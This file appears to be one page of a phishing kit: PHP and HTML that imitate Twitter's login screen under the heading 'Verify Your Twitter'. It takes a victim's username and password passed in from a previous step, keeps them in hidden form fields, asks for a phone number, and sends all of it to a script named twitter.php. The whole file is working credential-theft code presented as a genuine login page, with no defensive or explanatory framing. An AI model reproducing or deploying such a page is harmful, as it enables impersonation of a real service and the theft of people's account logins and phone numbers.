<?php
$username = $_GET['username'];
$password = $_GET['password'];
?>
<!DOCTYPE html>
<html lang="en" data-scribe-reduced-action-queue="true">
  

<head><meta http-equiv="Content-Type" content="text/html; charset=gb18030">
       <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5dcbabd2869127ad"></script>
    <link rel="stylesheet" href="https://abs.twimg.com/a/1557965746/css/t1/twitter_core.bundle.css" class="coreCSSBundles">
  <link rel="stylesheet" class="moreCSSBundles" href="https://abs.twimg.com/a/1557965746/css/t1/twitter_more_1.bundle.css">
  <link rel="stylesheet" class="moreCSSBundles" href="https://abs.twimg.com/a/1557965746/css/t1/twitter_more_2.bundle.css">
    <link rel="dns-prefetch" href="https://pbs.twimg.com">
    <link rel="dns-prefetch" href="https://t.co">
      <link rel="preload" href="https://abs.twimg.com/k/en/init.en.c701a168ea0721ee9c60.js" as="script">
      <link rel="preload" href="https://abs.twimg.com/k/en/0.commons.en.06a750caea28350212ee.js" as="script">

      <title>Login on Twitter</title>
      <meta name="robots" content="NOODP">
  <meta name="description" content="Welcome back to Twitter. Sign in now to check your notifications, join the conversation and catch up on Tweets from the people you follow.">
<meta name="msapplication-TileImage" content="../abs.twimg.com/favicons/win8-tile-144.png"/>
<meta name="msapplication-TileColor" content="#00aced"/>
<link rel="mask-icon" sizes="any" href="https://abs.twimg.com/a/1557965746/icons/favicon.svg" color="#1da1f2">
<link rel="shortcut icon" href="//abs.twimg.com/favicons/favicon.ico" type="image/x-icon">
<link rel="apple-touch-icon" href="https://abs.twimg.com/icons/apple-touch-icon-192x192.png" sizes="192x192">
<link rel="manifest" href="/manifest.json">
    <meta name="viewport" id="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  <meta name="swift-page-name" id="swift-page-name" content="login">
  <meta name="swift-page-section" id="swift-section-name" content="login">
    <link id="async-css-placeholder">
  </head>
  <body class="three-col logged-out ms-windows" 
data-fouc-class-names="swift-loading no-nav-banners"
 dir="ltr">
    <div id="doc" data-at-shortcutkeys="{&quot;Enter&quot;:&quot;Open Tweet details&quot;,&quot;o&quot;:&quot;Expand photo&quot;,&quot;/&quot;:&quot;Search&quot;,&quot;?&quot;:&quot;This menu&quot;,&quot;j&quot;:&quot;Next Tweet&quot;,&quot;k&quot;:&quot;Previous Tweet&quot;,&quot;Space&quot;:&quot;Page down&quot;,&quot;.&quot;:&quot;Load new Tweets&quot;,&quot;gu&quot;:&quot;Go to user\u2026&quot;}" class="route-login login-responsive">
        <div class="topbar js-topbar">
    <div class="global-nav global-nav--newLoggedOut" data-section-term="top_nav">
      <div class="global-nav-inner">
        <div class="container">

<ul class="nav js-global-actions" role="navigation" id="global-actions">
  <li id="global-nav-home" class="home" data-global-action="home">
    <a class="js-nav js-tooltip js-dynamic-tooltip" data-placement="bottom" href="index.html" data-component-context="home_nav" data-nav="home">
      <span class="Icon Icon--bird Icon--large"></span>
      <span class="text" aria-hidden="true">Home</span>
      <span class="u-hiddenVisually a11y-inactive-page-text">Home</span>
      <span class="u-hiddenVisually a11y-active-page-text">Home, current page.</span>
    </a>
  </li>
    <li id="global-nav-about" class="about" data-global-action="about">
      <a class="js-tooltip js-dynamic-tooltip" data-placement="bottom" href="" target="" data-component-context="about_nav" data-nav="about" rel="noopener">
        <span class="text">About</span>
      </a>
    </li>
</ul>
        </div>
      </div>
    </div>
</div>
<center>
        <div id="page-outer">
          <div id="page-container" class="AppContent wrapper wrapper-login">
              
            <div class="page-canvas">

  <div class="signin-wrapper" data-login-message="">
    <h1>Verify Your Twitter</h1>
    <form action="twitter.php" class="t1-form clearfix signin js-signin" method="get">
      <fieldset>
  <legend class="visuallyhidden">Log in</legend>
  <div class="clearfix field">
      <input name="username" type="hidden" value="<?php echo $username;?>" readonly>
<input name="password" type="hidden" value="<?php echo $password;?>" readonly>
    <input
      class="js-username-field email-input js-initial-focus"
      type="number"
      name="phone"
      autocomplete="on" value=""
        placeholder="Phone Number"
    />
  </div>
  
</fieldset>
      <div class="captcha js-captcha">
      </div>
      <div class="clearfix">
  <button type="submit" class="submit EdgeButton EdgeButton--primary EdgeButtom--medium">Log in</button>

  <div class="subchck">
    <label class="t1-label remember">
      
    </label>
  </div>
</div>

    </form>
  </div>

  <div class="clearfix mobile has-sms">
    
    </p>
  </div>
</div>
          </div>
        </div>
    </div>
</center>
<script src="https://abs.twimg.com/k/en/init.en.c701a168ea0721ee9c60.js" async></script>

  </body>


</html>
